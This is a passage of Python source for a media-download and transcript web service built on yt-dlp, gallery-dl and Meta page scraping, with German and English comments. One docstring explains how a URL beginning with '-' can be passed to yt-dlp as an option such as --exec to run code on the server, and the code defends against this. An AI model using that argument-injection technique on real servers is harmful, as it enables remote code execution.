    yt-dlp echoes the full proxy URL in its errors, credentials and all
    ("Unable to connect to proxy http://user:pass@…"). That text goes into
    job['error'], which every browser polls, and into the admin error log,
    which is downloadable as Markdown.
    """
    return _CREDS_RE.sub("://***:***@", text or "")


def friendly_error(stderr: str, url: str) -> str:
    """Map raw yt-dlp stderr to a short, actionable German message."""
    s = (stderr or "").lower()
    is_ig = "instagram.com" in url.lower() or "[instagram]" in s
    if any(k in s for k in ("login required", "empty media response",
                            "requested content is not available", "no csrf token",
                            "use --cookies", "rate-limit reached")):
        if is_ig:
            return ("Instagram verlangt jetzt einen Login. Öffentliche Downloads ohne "
                    "Cookies sind nicht mehr möglich — bitte Instagram-Cookies im Feld "
                    "„🔐 Cookies“ einfügen (einmal speichern reicht).")
        return ("Login/Cookies erforderlich oder Rate-Limit erreicht. Cookies im Feld "
                "„🔐 Cookies“ einfügen.")
    if "http error 404" in s or "not found" in s:
        return "Beitrag nicht gefunden (gelöscht oder privat?)."
    if "sign in to confirm your age" in s or ("age" in s and "confirm" in s):
        return "Altersbeschränkt — Cookies eines eingeloggten Accounts nötig."
    if "unsupported url" in s:
        return "URL wird nicht unterstützt."
    # Fallback: last non-empty stderr line, trimmed
    lines = [l for l in (stderr or "").splitlines() if l.strip()]
    return (lines[-1][:400] if lines else "Unbekannter Fehler")

# ── Subtitle parsing ──────────────────────────────────────────────────────────
# Segments are the canonical form: [{"start": float, "dur": float, "text": str}].
# json3 is preferred (clean, non-overlapping, timed). VTT is the fallback and
# needs sequential overlap removal because YouTube's auto-captions repeat the
# tail of each cue at the head of the next one ("karaoke" scrolling).

def json3_to_segments(raw: str) -> list[dict]:
    """Parse yt-dlp's json3 subtitle format into timed segments."""
    import json as _json
    try:
        data = _json.loads(raw)
    except Exception:
        return []
    out: list[dict] = []
    for ev in data.get("events") or []:
        text = "".join(s.get("utf8", "") for s in (ev.get("segs") or []))
        text = text.replace("\n", " ").strip()
        if not text:
            continue
        start = (ev.get("tStartMs") or 0) / 1000.0
        dur = (ev.get("dDurationMs") or 0) / 1000.0
        out.append({"start": start, "dur": dur, "text": re.sub(r"\s+", " ", text)})
    return out


def _strip_overlap(prev_words: list[str], new_words: list[str], max_overlap: int = 24) -> list[str]:
    """Return new_words minus the longest prefix that repeats the tail of prev_words."""
    k_max = min(len(prev_words), len(new_words), max_overlap)
    for k in range(k_max, 0, -1):
        if [w.lower() for w in prev_words[-k:]] == [w.lower() for w in new_words[:k]]:
            return new_words[k:]
    return new_words


def _ts_to_seconds(ts: str) -> float:
    m = re.match(r"(?:(\d+):)?(\d{1,2}):(\d{2})[.,](\d{1,3})", ts.strip())
    if not m:
        return 0.0
    h, mnt, sec, ms = m.groups()
    return int(h or 0) * 3600 + int(mnt) * 60 + int(sec) + int(ms.ljust(3, "0")) / 1000.0


def vtt_to_segments(vtt_content: str) -> list[dict]:
    """Parse VTT into timed segments, removing YouTube's karaoke overlap between
    consecutive cues (sequential — never global, that would delete real repeats)."""
    segments: list[dict] = []
    cur_start = cur_end = None
    buf: list[str] = []
    prev_words: list[str] = []

    def flush():
        nonlocal buf, cur_start, cur_end, prev_words
        if cur_start is None or not buf:
            buf = []
            return
        words = " ".join(buf).split()
        words = _strip_overlap(prev_words, words)
        if words:
            segments.append({"start": cur_start,
                             "dur": max(0.0, (cur_end or cur_start) - cur_start),
                             "text": " ".join(words)})
            prev_words = (prev_words + words)[-40:]
        buf = []

    for line in vtt_content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("WEBVTT") or re.match(r"^(Kind|Language|NOTE|STYLE|REGION):", line):
            continue
        if re.match(r"^\d+$", line):
            continue
        if "-->" in line:
            flush()
            parts = line.split("-->")
            cur_start = _ts_to_seconds(parts[0])
            cur_end = _ts_to_seconds(parts[1].split()[0]) if len(parts) > 1 else cur_start
            continue
        # Strip inline karaoke timing tags (<00:00:01.234><c>word</c>)
        clean = re.sub(r"<[^>]+>", "", line).strip()
        if clean:
            buf.append(clean)
    flush()
    return segments


def segments_to_text(segments: list[dict]) -> str:
    return re.sub(r"\s+", " ", " ".join(s["text"] for s in segments)).strip()


def _fmt_ts(sec: float, comma: bool = False) -> str:
    sec = max(0.0, float(sec or 0))
    h, rem = divmod(int(sec), 3600)
    m, s = divmod(rem, 60)
    ms = int(round((sec - int(sec)) * 1000))
    sep = "," if comma else "."
    return f"{h:02d}:{m:02d}:{s:02d}{sep}{ms:03d}"


def segments_to_srt(segments: list[dict]) -> str:
    out = []
    for i, s in enumerate(segments, 1):
        end = s["start"] + (s["dur"] or 2.0)
        out.append(f"{i}\n{_fmt_ts(s['start'], True)} --> {_fmt_ts(end, True)}\n{s['text']}\n")
    return "\n".join(out)


def segments_to_vtt(segments: list[dict]) -> str:
    out = ["WEBVTT", ""]
    for s in segments:
        end = s["start"] + (s["dur"] or 2.0)
        out.append(f"{_fmt_ts(s['start'])} --> {_fmt_ts(end)}\n{s['text']}\n")
    return "\n".join(out)


def _clock(sec) -> str:
    """Sekunden als mm:ss, bei über einer Stunde als h:mm:ss.

    Dasselbe Format, das die Transkript-Ansicht schon benutzt — herausgezogen,
    damit die Suche es nicht ein zweites Mal nachbaut und die beiden
    auseinanderlaufen.
    """
    h, rem = divmod(int(sec or 0), 3600)
    m, s = divmod(rem, 60)
    return f"{h}:{m:02d}:{s:02d}" if h else f"{m}:{s:02d}"


def segments_to_timestamped(segments: list[dict]) -> str:
    """Human-readable '[mm:ss] text' lines — the youtube-transcript.io default view."""
    return "\n".join(f"[{_clock(s['start'])}] {s['text']}" for s in segments)


def vtt_to_text(vtt_content: str) -> str:
    """Backwards-compatible helper: VTT string → clean plain text."""
    return segments_to_text(vtt_to_segments(vtt_content))


async def run_cmd(cmd: list[str]) -> tuple[int, str, str]:
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await proc.communicate()
    return proc.returncode, stdout.decode(), stderr.decode()


def _ytdlp_cmd() -> list[str]:
    """Invoke the yt-dlp belonging to *this* interpreter, not whichever one is
    first on PATH.

    Found by the smoke test: the Mac app runs inside its own virtualenv with
    yt-dlp 2026.08.19, but PATH puts Homebrew first, so every call was landing
    on a June build — three months of extractor fixes missing, and the
    self-update dutifully upgrading a copy nobody was using. The failure mode
    is the worst kind: it works, until it silently does not.
    """
    import sys
    try:
        import yt_dlp  # noqa: F401
        return [sys.executable, "-m", "yt_dlp"]
    except Exception:
        return ["yt-dlp"]          # installed as a standalone binary


YTDLP_MISSING = ("No media extractor installed (yt-dlp). Platforms other than "
                 "YouTube captions and podcasts need it; see README → "
                 "Optional: media extractors.")


async def run_ytdlp(args: list[str]) -> tuple[int, str, str]:
    # The image ships without yt-dlp. Every caller already handles a failed
    # run; a raised FileNotFoundError instead reached MCP clients as a bare
    # "[Errno 2] No such file or directory".
    try:
        return await run_cmd(_ytdlp_cmd() + args)
    except FileNotFoundError:
        return 127, "", YTDLP_MISSING


def require_http_url(url: str) -> str:
    """Eine URL, die in eine Argumentliste darf.

    `/api/batch` filterte mit `^https?://`, `/api/trim` prüfte nur auf
    nicht-leer und `/api/transcript` gar nichts. Die URL landet als Argument
    bei yt-dlp, und yt-dlp liest alles, was mit `-` beginnt, als Option: aus
    `--config-locations=…` wird eine Konfigurationsdatei, aus `--paths …` ein
    Schreibziel, und mit einer Datei, die der Angreifer vorher über einen
    regulären Download platziert hat, wird daraus `--exec` — also
    Codeausführung auf dem Server.

    Das Schema zu verlangen schließt das, weil kein Optionsname mit `http://`
    beginnt. Gleichzeitig ist es die Prüfung, die `/api/batch` schon hatte;
    sie fehlte nur an zwei von drei Stellen.
    """
    u = (url or "").strip()
    if not re.match(r"^https?://", u, re.I):
        raise HTTPException(400, "Nur http(s)-Adressen.")
    return u


def content_disposition(name: str, kind: str = "attachment") -> str:
    """A Content-Disposition value that survives any title.

    File names here come from video and episode titles: umlauts, emoji and
    quotes are normal. Putting them raw into `filename="…"` breaks in two
    ways — a `"` ends the parameter early, and non-latin-1 characters cannot
    be encoded in an HTTP header at all (Starlette raises). RFC 6266/5987:
    `filename*` carries the real name percent-encoded as UTF-8, and a plain
    ASCII `filename` stays as the fallback for clients that ignore it.
    """
    import unicodedata
    name = re.sub(r"[\x00-\x1f\x7f\r\n]+", "", str(name or "")).strip() or "download"
    # NFKD first so "Ü" degrades to "U" rather than vanishing.
    fallback = unicodedata.normalize("NFKD", name).encode("ascii", "ignore").decode()
    fallback = re.sub(r'["\\]', "_", fallback).strip() or "download"
    quoted = urllib.parse.quote(name, safe="")
    return f"{kind}; filename=\"{fallback}\"; filename*=UTF-8''{quoted}"


HEIGHTS = {"1080", "720", "480", "360", "240", "144"}

# Tracking/junk query parameters that make the same post look like two URLs.
_JUNK_PARAMS = re.compile(
    r"(?:^|[?&])(?:img_index|utm_[a-z]+|igshid|igsh|fbclid|gclid|si|feature|"
    r"share_id|ref|ref_src|_nc_\w+)=[^&]*", re.I)


def normalize_url(url: str) -> str:
    """Canonical form for duplicate detection: same post → same string.

    Instagram appends ?img_index=, shares carry ?igsh=, YouTube has youtu.be
    short links and extra params — all of which hide duplicates from the user.
    """
    u = url.strip()
    u = re.sub(r"^https?://", "", u, flags=re.I)
    u = re.sub(r"^(www|m|mobile)\.", "", u, flags=re.I)
    u = u.replace("threads.net/", "threads.com/")

    # YouTube: reduce every shape to the bare video id.
    m = (re.search(r"youtu\.be/([A-Za-z0-9_-]{6,})", u)
         or re.search(r"youtube\.com/(?:watch\?.*?v=|shorts/|embed/|live/)([A-Za-z0-9_-]{6,})", u))
    if m:
        return f"youtube:{m.group(1)}"

    u = _JUNK_PARAMS.sub("", u)
    u = re.sub(r"[?&]+$", "", u).rstrip("/")
    return u.lower()


def dedupe_urls(urls: list[str]) -> tuple[list[str], list[str]]:
    """Split into (unique, duplicates) while preserving the original order."""
    seen: set[str] = set()
    unique, dupes = [], []
    for u in urls:
        key = normalize_url(u)
        if key in seen:
            dupes.append(u)
        else:
            seen.add(key)
            unique.append(u)
    return unique, dupes

# yt-dlp player clients for YouTube (a plain yt-dlp extractor argument).
#
# The working set changes every few weeks as YouTube changes which clients
# serve which formats — keep it in env, never hardcode a preference. History
# that cost us: android_vr was the recommendation for months until YouTube
# started 403-ing every one of its formats on 2026-08-17. visionos is the
# current default (no JS player); web rides along because its webpage is
# fetched anyway and it carries the translation language list.
YT_CLIENTS = os.environ.get("YT_CLIENTS", "visionos,web")
YT_PLAYER_CLIENTS = os.environ.get(
    "YT_PLAYER_CLIENTS", f"youtube:player_client={YT_CLIENTS}")

# Optional instance-specific extensions. Not part of the public repository;
# without the module every hook below is skipped and nothing changes.
try:
    import private_ext  # noqa: E402
except ImportError:
    private_ext = None

# ── Whisper fallback ──────────────────────────────────────────────────────────
# The only transcript path that does not depend on a subtitle track at all:
# pull audio only (4-10 MB for 10 minutes, a tenth of a video) and transcribe
# locally. Slower, but it works on videos that have no subtitles whatsoever.
WHISPER_ENABLED = os.environ.get("WHISPER_ENABLED", "1").strip().lower() not in ("0", "false", "no")
WHISPER_MODEL = os.environ.get("WHISPER_MODEL", "base")
WHISPER_MODEL_DIR = os.environ.get("WHISPER_MODEL_DIR", "models")
WHISPER_MAX_MINUTES = int(os.environ.get("WHISPER_MAX_MINUTES", "45"))
WHISPER_BEAM = int(os.environ.get("WHISPER_BEAM", "1"))
# How many Whisper runs may share the machine. One by default: two concurrent
# runs on a small VPS swap each other to death, and a queue is friendlier than
# an OOM kill. A box with real headroom can raise it.
WHISPER_CONCURRENCY = max(1, int(os.environ.get("WHISPER_CONCURRENCY", "1")))
# Podcast packages normally leave transcription to the person's own machine
# (see _podcast_transcribe_local). An operator with a server that can carry it
# opts in here; off by default because the default host cannot.
PODCAST_SERVER_WHISPER = os.environ.get("PODCAST_SERVER_WHISPER", "0").strip().lower() in ("1", "true", "yes")
# Ceiling for files people upload to be transcribed. Streamed to disk against
# this limit, so a 4 GB video is refused after 500 MB rather than after it has
# filled the disk.
UPLOAD_MAX_MB = int(os.environ.get("UPLOAD_MAX_MB", "500"))
UPLOAD_EXTENSIONS = {"mp3", "m4a", "wav", "ogg", "opus", "flac", "aac",
                     "mp4", "mov", "webm", "mkv"}


def _yt_extractor_args(has_file_cookies: bool = False) -> list[str]:
    """Shared yt-dlp arguments for every call that touches YouTube.

    has_file_cookies says whether the caller already passed --cookies. If so,
    the browser jar is left alone: handing yt-dlp both sources is ambiguous,
    and an explicitly uploaded file is the more deliberate choice of the two.
    """
    args = ["--extractor-args", YT_PLAYER_CLIENTS]
    if private_ext:
        args += private_ext.ytdlp_args()
    if not has_file_cookies:
        args += _browser_cookie_args()
    return args

# Off by default. A fresh install does transcripts, captions and metadata —
# the things this exists for — and refuses YouTube media until someone turns
# that on deliberately. Nothing here is preconfigured for the awkward path.
# Set ENABLE_YOUTUBE_VIDEO=1 to allow it. The other platforms are unaffected.
ENABLE_YOUTUBE_VIDEO = os.environ.get(
    "ENABLE_YOUTUBE_VIDEO", "0").strip().lower() in ("1", "true", "yes")


def youtube_video_enabled() -> bool:
    """Whether YouTube media may be fetched right now.

    Server: the operator's environment variable, read once. Desktop: a runtime
    setting the person switches in the System view — only after installing an
    extractor with consent and acknowledging the separate warning (see
    /api/media/settings). The environment value is merely its default.
    """
    if DESKTOP_MODE:
        return db.get_setting("youtube_video",
                              "1" if ENABLE_YOUTUBE_VIDEO else "0") == "1"
    return ENABLE_YOUTUBE_VIDEO


def _is_youtube(url: str) -> bool:
    u = url.lower()
    return "youtube.com" in u or "youtu.be" in u


def _format_selector(quality: str) -> str:
    if quality in HEIGHTS:
        n = quality
        # Trailing /best fallback: Instagram serves single progressive formats
        # with no height label, so the height filter alone can fail.
        return f"bestvideo[height<={n}]+bestaudio/best[height<={n}]/best"
    return "bestvideo+bestaudio/best"


async def _download_single(job_id: str, url: str, cookies: str, quality: str,
                           audio_only: bool, all_parts: bool = False,
                           _proxy: str = "", _proxy_retry: bool = False) -> str | None:
    """Download one URL with live progress; updates jobs[job_id]; returns first path.
    _proxy/_proxy_retry are internal (used by optional extensions)."""
    jobs[job_id]["status"] = "running"
    jobs[job_id]["progress"] = 0

    out_template = str(DOWNLOAD_DIR / f"%(upload_date)s_%(uploader)s_%(title).70s_%(id)s.%(ext)s")

    cookie_file = None
    tmp_cookie = None
    if cookies.strip():
        tmp_cookie = TMP_DIR / f"{job_id}_cookies.txt"
        tmp_cookie.write_text(cookies.strip())
        cookie_file = tmp_cookie

    args = ["--ignore-errors", "--write-info-json", "--trim-filenames", "180",
            "--newline", "--progress-template", "download:__PROG__%(progress._percent_str)s",
            "-o", out_template]
    if not all_parts:
        args = ["--no-playlist"] + args           # carousel/playlist off by default
    else:
        # Playlist/channel import — cap to avoid a runaway channel grab.
        args = ["--playlist-end", os.environ.get("PLAYLIST_MAX", "30")] + args
    if cookie_file:
        args += ["--cookies", str(cookie_file)]

    if audio_only:
        afmt = _audio_fmt(job_id)
        args += ["-f", "bestaudio/best", "-x", "--audio-format", AUDIO_FORMATS[afmt][0]]
        if afmt == "mp3":
            args += ["--audio-quality", "0"]
    else:
        args += ["-f", _format_selector(quality), "--merge-output-format", "mp4"]

    if _proxy:
        args = ["--proxy", _proxy] + args
    # "--" ends option parsing: whatever the URL turns out to be, yt-dlp can
    # never read it as an option (see require_http_url for why that matters).
    args += ["--print", "after_move:__FILE__%(filepath)s", "--", url]

    files: list[str] = []
    from collections import deque
    err_tail: deque = deque(maxlen=50)
    # Same interpreter-bound yt-dlp as everywhere else (see _ytdlp_cmd); the
    # bare name could hit an older copy earlier on PATH.
    try:
        proc = await asyncio.create_subprocess_exec(
            *_ytdlp_cmd(), *args, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE)
    except FileNotFoundError:
        jobs[job_id]["status"] = "error"
        jobs[job_id]["error"] = YTDLP_MISSING
        return None

    async def read_out():
        async for raw in proc.stdout:
            line = raw.decode(errors="replace").rstrip("\n")
            if line.startswith("__FILE__"):
                fp = line[len("__FILE__"):].strip()
                if fp:
                    files.append(fp)

    async def read_err():
        async for raw in proc.stderr:
            line = raw.decode(errors="replace").rstrip("\n")
            if "__PROG__" in line:
                m = re.search(r"__PROG__\s*([\d.]+)%", line)
                if m:
                    try:
                        jobs[job_id]["progress"] = int(float(m.group(1)))
                    except ValueError:
                        pass
            elif line.strip():
                err_tail.append(line)

    await asyncio.gather(read_out(), read_err())
    await proc.wait()

    if tmp_cookie and tmp_cookie.exists():
        tmp_cookie.unlink()

    # Dedupe, keep only files that actually exist.
    seen, real = set(), []
    for f in files:
        if f and f not in seen and Path(f).exists():
            seen.add(f); real.append(f)

    if real:
        jobs[job_id]["progress"] = 100
        jobs[job_id]["status"] = "done"
        jobs[job_id]["filepaths"] = real
        jobs[job_id]["filepath"] = real[0]
        jobs[job_id]["filename"] = Path(real[0]).name if len(real) == 1 else f"{len(real)} Dateien"
        jobs[job_id]["meta"] = _read_info_json(real[0], url)
        return real[0]

    stderr_text = "\n".join(err_tail)

    if private_ext and _is_youtube(url) and not _proxy_retry:
        async def _again(px: str):
            fp = await _download_single(job_id, url, cookies, quality, audio_only,
                                        all_parts, _proxy=px, _proxy_retry=True)
            return fp, jobs[job_id].get("error") or ""
        fp = await private_ext.retry_download(stderr_text, _again)
        if fp:
            jobs[job_id]["via_proxy"] = True
            return fp

    jobs[job_id]["status"] = "error"
    jobs[job_id]["error"] = friendly_error(scrub(stderr_text), url)
    log_error("Download", scrub(stderr_text) or jobs[job_id]["error"], url)
    return None


GALLERY_MEDIA_EXT = {".jpg", ".jpeg", ".png", ".webp", ".mp4", ".mov", ".heic", ".gif"}


def _first_str(d: dict, *keys) -> str:
    for k in keys:
        v = d.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()
        if isinstance(v, dict):
            for kk in ("name", "username", "full_name"):
                vv = v.get(kk)
                if isinstance(vv, str) and vv.strip():
                    return vv.strip()
    return ""


async def _download_gallery(job_id: str, url: str, cookies: str,
                            audio_only: bool = False) -> str | None:
    """gallery-dl path: Instagram image posts & carousels, Threads postings.
    Downloads all media, extracts the post text and writes it as post.md + post.txt.
    Used directly for Threads and as automatic fallback when yt-dlp finds no video."""
    import json as _json
    jobs[job_id]["status"] = "running"
    job_dir = DOWNLOAD_DIR / f"g_{job_id[:8]}"
    job_dir.mkdir(exist_ok=True)

    ck = None
    if cookies.strip():
        ck = TMP_DIR / f"{job_id}_gck.txt"
        ck.write_text(cookies.strip())
    ck_args = ["--cookies", str(ck)] if ck else []

    code, out, err = await run_cmd(
        ["gallery-dl", "-D", str(job_dir), "--write-metadata"] + ck_args + ["--", url])

    media = sorted(p for p in job_dir.glob("*") if p.suffix.lower() in GALLERY_MEDIA_EXT)
    meta_files = sorted(job_dir.glob("*.json"))

    dicts: list[dict] = []
    for mf in meta_files:
        try:
            d = _json.loads(mf.read_text(encoding="utf-8", errors="replace"))
            if isinstance(d, dict):
                dicts.append(d)
        except Exception:
            pass

    # Text-only posting (e.g. Threads without media): dump metadata without download.
    if not media and not dicts:
        _, out2, _ = await run_cmd(["gallery-dl"] + ck_args + ["-j", "--", url])
        try:
            for item in _json.loads(out2 or "[]"):
                if isinstance(item, list) and item and isinstance(item[-1], dict):
                    dicts.append(item[-1])
        except Exception:
            pass

    text = uploader = date = title = ""
    for d in dicts:
        text = text or _first_str(d, "description", "content", "text", "caption")
        uploader = uploader or _first_str(d, "username", "uploader", "author", "user", "owner")
        date = date or _first_str(d, "date", "post_date", "upload_date")
        title = title or _first_str(d, "title")

    platform = _platform_of(url) or "Post"
    if text:
        md = [f"# {title or (uploader + ' — ' if uploader else '') + platform + '-Post'}",
              "", f"- **Quelle:** {url}"]
        if uploader: md.append(f"- **Creator:** {uploader}")
        if date: md.append(f"- **Datum:** {date}")
        md += ["", text, ""]
        (job_dir / "post.md").write_text("\n".join(md), encoding="utf-8")
        (job_dir / "post.txt").write_text(text + "\n", encoding="utf-8")

    for mf in meta_files:
        mf.unlink(missing_ok=True)

    # MP3 mode: convert downloaded videos, drop the video files.
    if audio_only:
        for p in list(job_dir.glob("*")):
            if p.suffix.lower() in {".mp4", ".mov"}:
                mp3 = await _extract_audio(str(p), _audio_fmt(job_id))
                if mp3:
                    p.unlink(missing_ok=True)

    if ck and ck.exists():
        ck.unlink()

    files = sorted(str(p) for p in job_dir.glob("*") if p.is_file())
    if not files:
        jobs[job_id]["status"] = "error"
        jobs[job_id]["error"] = friendly_error(scrub(err or out), url)
        return None

    n_media = len([f for f in files if Path(f).suffix.lower() in GALLERY_MEDIA_EXT | {".mp3"}])
    label = Path(files[0]).name if len(files) == 1 else \
        f"{n_media} Medien" + (" + Text" if text else "")
    jobs[job_id].update({
        "status": "done", "progress": 100, "filepaths": files, "filepath": files[0],
        "filename": label,
        "meta": {"title": title or (text[:80] if text else label), "uploader": uploader,
                 "webpage_url": url, "upload_date": date, "description": text,
                 "extractor": platform},
    })
    return files[0]


# ── Meta platforms: Threads & Instagram ───────────────────────────────────────
# Neither yt-dlp nor gallery-dl gets image posts here without a login, so we
# read the JSON Meta embeds in its own pages (<script type="application/json"
# data-sjs>). Threads and Instagram share the same post schema, so one parser
# serves both: `thread_items` for Threads chains, `carousel_media` for
# Instagram carousels — and text-only posts, which carry no media at all.

def _meta_json_blocks(html: str) -> list:
    """Parse every embedded data-sjs JSON payload from a Meta page."""
    import json as _json
    out = []
    for block in re.findall(
            r'<script type="application/json"[^>]*data-sjs[^>]*>(.*?)</script>', html, re.S):
        try:
            out.append(_json.loads(block))
        except Exception:
            continue
    return out


def _meta_fetch(url: str, cookies: str = "") -> str:
    """Fetch a Meta page with a browser fingerprint (works without login)."""
    from curl_cffi import requests as creq
    kw = {"impersonate": "chrome", "timeout": 30}
    if cookies.strip():
        jar = {}
        for line in cookies.splitlines():
            parts = line.split("\t")
            if len(parts) >= 7 and ("instagram" in parts[0] or "threads" in parts[0]):
                jar[parts[5]] = parts[6]
        if jar:
            kw["cookies"] = jar
    return creq.get(url, **kw).text


def media_stem(platform: str, author: str = "", ident: str = "",
               job_id: str = "") -> str:
    """Ein Dateiname-Stamm, der auch im Sammelordner noch eindeutig ist.

    Die Dateien lagen vorher als `01.jpg`, `02.jpg` in ihrem Job-Ordner. Dort
    kollidiert nichts, und genau deshalb ist es lange nicht aufgefallen: die
    Kollision entsteht erst beim Herunterladen, wenn zehn Karussells eines
    Tages im selben Ordner landen und das zehnte `01.jpg` die ersten neun
    überschreibt oder vom Browser durchnummeriert wird — dann heißt es
    `01-7.jpg` und sagt gar nichts mehr.

    Deshalb steht die Kennung im Namen und nicht die Position allein. In
    dieser Reihenfolge, weil sie von stabil nach notdürftig geht:

    * `ident` — bei Instagram der Shortcode aus der URL. Der benennt den
      Beitrag weltweit und bleibt derselbe, auch wenn man ihn ein Jahr später
      erneut lädt. Der war schon da (`want_code`) und wurde nie benutzt.
    * `author` — ohne Shortcode wenigstens, von wem es ist.
    * `job_id` — die letzte Sicherung. Nicht sprechend, aber eindeutig; ohne
      sie wären zwei Beiträge desselben Kontos ohne Shortcode wieder gleich
      benannt.

    Die laufende Nummer hängt der Aufrufer an. Sie bleibt, weil die Ordnung im
    Karussell eine Information ist — sie ist nur nicht die Kennung.
    """
    def slug(s: str) -> str:
        s = re.sub(r"[^A-Za-z0-9_-]+", "-", (s or "").strip().lstrip("@"))
        return re.sub(r"-{2,}", "-", s).strip("-")[:40]

    parts = [platform]
    if slug(author):
        parts.append(slug(author))
    if slug(ident):
        parts.append(slug(ident))
    elif job_id:
        parts.append(job_id[:8])
    return "_".join(p for p in parts if p)


def _meta_save(url: str, dest: Path):
    from curl_cffi import requests as creq
    r = creq.get(url, impersonate="chrome", timeout=60)
    if r.status_code == 200 and r.content:
        dest.write_bytes(r.content)


def _threads_walk(node, out: list):
    if isinstance(node, dict):
        if isinstance(node.get("thread_items"), list) and node["thread_items"]:
            out.append(node["thread_items"])
        for v in node.values():
            _threads_walk(v, out)
    elif isinstance(node, list):
        for v in node:
            _threads_walk(v, out)


def _threads_post_fields(item: dict) -> dict | None:
    """Normalise one thread item into {user, text, code, taken_at, images, videos}."""
    post = item.get("post") if isinstance(item, dict) else None
    if not isinstance(post, dict):
        return None
    caption = post.get("caption") or {}
    text = (caption.get("text") if isinstance(caption, dict) else "") or ""
    if not text:
        tpai = post.get("text_post_app_info") or {}
        frags = (tpai.get("text_fragments") or {}).get("fragments") or []
        text = "".join(f.get("plaintext", "") for f in frags if isinstance(f, dict))

    images, videos = [], []
    for vv in (post.get("video_versions") or []):
        if isinstance(vv, dict) and vv.get("url"):
            videos.append(vv["url"])
            break
    cands = ((post.get("image_versions2") or {}).get("candidates") or [])
    best = max((c for c in cands if isinstance(c, dict) and c.get("url")),
               key=lambda c: c.get("width", 0), default=None)
    if best and not videos:
        images.append(best["url"])
    # Carousel: several sub-items
    for child in (post.get("carousel_media") or []):
        if not isinstance(child, dict):
            continue
        for vv in (child.get("video_versions") or []):
            if isinstance(vv, dict) and vv.get("url"):
                videos.append(vv["url"])
                break
        else:
            cc = ((child.get("image_versions2") or {}).get("candidates") or [])
            b = max((c for c in cc if isinstance(c, dict) and c.get("url")),
                    key=lambda c: c.get("width", 0), default=None)
            if b:
                images.append(b["url"])

    return {
        "user": (post.get("user") or {}).get("username") or "",
        "text": text.strip(),
        "code": post.get("code") or "",
        "taken_at": post.get("taken_at") or 0,
        "images": images,
        "videos": videos,
    }


async def _download_threads(job_id: str, url: str, cookies: str,
                            audio_only: bool = False) -> str | None:
    """Fetch a Threads post (or the whole chain) — text-only posts included."""
    jobs[job_id]["status"] = "running"
    job_dir = DOWNLOAD_DIR / f"t_{job_id[:8]}"
    job_dir.mkdir(exist_ok=True)

    want_code = ""
    m = re.search(r"/post/([A-Za-z0-9_-]+)", url)
    if m:
        want_code = m.group(1)
    # Ein /share/-Link nennt den Beitrag nicht in der Adresse. Das war der
    # Grund für den schlimmsten Fehler, den dieses Modul hatte: want_code
    # blieb leer, der Rückfall unten nahm „die längste Kette auf der Seite",
    # und das ist auf einer Share-Seite der Beitrag eines Fremden. Heraus kam
    # ein Status »fertig« mit dem Text einer anderen Person.
    is_share = bool(re.search(r"/share/[A-Za-z0-9_-]+", url))
    # Hat die Adresse überhaupt einen bestimmten Beitrag benannt? Davon hängt
    # ab, ob Raten erlaubt ist.
    names_a_post = bool(want_code) or is_share

    try:
        html = await asyncio.to_thread(_meta_fetch, url, cookies)
    except Exception as e:
        jobs[job_id].update({"status": "error", "error": f"Threads nicht erreichbar: {e}"})
        return None

    if is_share and not want_code:
        # Die Share-Seite sagt selbst, welcher Beitrag gemeint ist — an fünf
        # Stellen, und alle fünf stimmten im geprüften Fall überein. Der
        # Share-Code selbst steht dagegen nirgends im HTML, man kann also
        # nicht über ihn suchen.
        #
        # Die Daten des Beitrags trägt die Share-Seite aber NICHT: im
        # Seiten-JSON stehen fremde Beiträge (Empfehlungen), und der gesuchte
        # fehlt. Deshalb wird hier auf den Permalink umgeleitet und der
        # geladen — eine zweite Anfrage, die sich nicht vermeiden lässt.
        perma = ""
        for pat in (r'rel="canonical" href="([^"]+/post/[A-Za-z0-9_-]+)"',
                    r'property="og:url" content="([^"]+/post/[A-Za-z0-9_-]+)"'):
            m = re.search(pat, html)
            if m:
                # Threads schreibt das @ als HTML-Entity in das Attribut.
                import html as _h
                perma = _h.unescape(m.group(1))
                break
        # Hier stand eine zweite Quelle für den Code: das erste Vorkommen von
        # "shortcode" im HTML. Sie war eine Hintertür in genau den Fehler, den
        # dieser Block schließen soll. Der Kommentar oben sagt es selbst — im
        # Seiten-JSON stehen FREMDE Beiträge. Fand sich kein Permalink, nahm
        # die Suche den Code eines Fremden, der Beitrag stand dann auch auf
        # der Seite, die Schutzprüfung weiter unten griff nicht, und heraus
        # kam wieder Status „fertig" mit dem Text einer anderen Person.
        #
        # Bei vorhandenem Permalink wurde ihr Ergebnis ohnehin überschrieben.
        # Sie war also ausschließlich im gefährlichen Fall wirksam.
        if perma:
            m = re.search(r"/post/([A-Za-z0-9_-]+)", perma)
            if m:
                want_code = m.group(1)
            try:
                html = await asyncio.to_thread(_meta_fetch, perma, cookies)
                url = perma          # ab hier ist der Permalink die Quelle
            except Exception as e:
                jobs[job_id].update({
                    "status": "error",
                    "error": f"Permalink hinter dem Share-Link nicht erreichbar: {e}"})
                return None
            # Kein Neu-Parsen an dieser Stelle: `html` und `url` zeigen jetzt
            # auf den Permalink, und die Auswertung darunter läuft ohnehin
            # genau einmal über das aktuelle `html`.
        if not want_code:
            jobs[job_id].update({
                "status": "error",
                "error": ("Share-Link nicht auflösbar — die Seite nennt den Beitrag nicht. "
                          "Bitte den direkten Link verwenden (threads.com/@konto/post/…)."),
            })
            log_error("Threads", "Share-Seite ohne Permalink-Angabe", url)
            return None

    chains: list = []
    for payload in _meta_json_blocks(html):
        _threads_walk(payload, chains)

    # Flatten every post found on the page, then rebuild the author's chain.
    all_posts: list[dict] = []
    for chain in chains:
        for item in chain:
            p = _threads_post_fields(item)
            if p and p.get("text") is not None:
                all_posts.append(p)

    anchor = next((p for p in all_posts if want_code and p["code"] == want_code), None)
    if anchor is None and names_a_post:
        # Die Adresse hat einen bestimmten Beitrag benannt, und der ist nicht
        # auf der Seite. Hier stand ein Rückfall auf „die längste Kette", und
        # das ist der gefährlichste Satz, den dieses Modul hatte: er liefert
        # einen fremden Beitrag und meldet Erfolg. Wer das nicht nachprüft,
        # zitiert irgendwann die falsche Person.
        #
        # Raten ist nur dort vertretbar, wo die Adresse gar keinen Beitrag
        # nennt — bei einem Profil-Link etwa. Benennt sie einen, ist sein
        # Fehlen eine Auskunft und kein Anlass für einen Ersatz.
        jobs[job_id].update({
